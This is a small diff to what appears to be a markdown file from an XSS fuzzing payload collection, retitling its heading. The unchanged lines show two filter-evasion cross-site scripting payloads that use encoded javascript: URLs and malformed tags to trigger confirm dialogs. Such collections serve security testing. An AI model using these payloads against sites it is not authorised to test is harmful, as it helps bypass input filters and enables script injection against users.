@@ -1,5 +1,4 @@
-# XSSfUZZING
-### -- [ XSS fUZZING ] --
+# -- [ XSS fUZZING ] --
 ```
 <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <d3"<"/onclick="1>[confirm``]"<">z
